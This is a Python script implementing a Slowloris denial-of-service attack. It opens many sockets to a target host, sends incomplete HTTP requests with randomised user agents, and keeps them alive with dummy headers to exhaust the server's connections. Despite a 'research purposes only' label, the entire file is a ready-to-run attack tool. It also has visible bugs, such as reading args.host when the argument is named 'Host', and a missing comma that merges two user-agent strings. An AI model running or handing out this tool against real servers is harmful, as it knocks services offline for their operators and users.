# Research:
# https://gist.github.com/gkbrk/5de70f35e69343718431
# https://github.com/gkbrk/slowloris/blob/master/slowloris.py
# https://github.com/wal99d/SlowLoris/blob/master/slowloris_v1.py
# https://github.com/adrianchifor/pyslowloris/blob/master/slowloris.py
# https://en.wikipedia.org/wiki/User_agent

import socket
import random
import time
import sys
import argparse  # this one is nice. try it out.

debug = True

parser = argparse.ArgumentParser(
    description="Slow loris DoS script for research purposes only."
)
parser.add_argument(
    "Host",
    nargs="?",
    help="Target ip address."
)
parser.add_argument(
    "-p",
    "--port",
    default=80,
    help="Port of target host. Yours is probably 80.",
    type=int
)
parser.add_argument(
    "-s",
    "--sockets",
    default=100,
    help="Max socket count. The higher the better!",
    type=int
)
args = parser.parse_args()


def log(text):
    if debug:
        print(text)


def lognb(text):
    if debug:
        print(text, end=" ")


list_of_sockets = []

# list for randomizing the user agent.
user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]

if len(sys.argv) <= 1:
    parser.print_help()
    exit()

ip = args.host  # fist argument <ip>
socket_count = args.sockets  # scale this. might make it an argument later
timeout = 4
port = args.port

log("Attacking {} by occupying {} sockets.".format(ip, socket_count))
log("Creating sockets...")

for i in range(socket_count):
    try:
        log("Creating socket #{}".format(i))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
    except Exception as e:
        log("ERROR socket #{}: {}".format(i, str(e)))
        break
    list_of_sockets.append(s)

log("{} total sockets created".format(len(list_of_sockets)))

if len(list_of_sockets) == 0:
    log("Unable to create any sockets. Exiting...")
    exit()


log("Setting up the sockets...")
for s in list_of_sockets:
    s.send("GET/?{} HTTP/1.1\r\n".format(random.randint(0, 3000)).encode("utf-8"))
    s.send("User-Agent: {} \r\n".format(random.choice(user_agents)).encode("utf-8"))  # rng user agent.
    s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
    # only 1 break character so the request is incomplete.

while True:
    log("Sending keep-alive headers...")
    for s in list_of_sockets:
        try:
            s.send("X-a {}\r\n".format(random.randint(1, 5000)).encode('UTF-8'))
        except socket.error:
            lognb("A socket disconnected. reconnecting...".format(s))
            list_of_sockets.remove(s)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
                s.connect((ip, port))
                s.send("GET/?{} HTTP/1.1\r\n".format(random.randint(0, 3000)).encode("utf-8"))
                s.send(
                    bytes("User-Agent: {} \r\n".format(random.choice(user_agents)).encode("utf-8")))  # rng user agent.
                s.send(bytes("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8")))
                log("Reconnected.")
            except socket.error:
                log("Socket dropped")
                continue
    time.sleep(15)
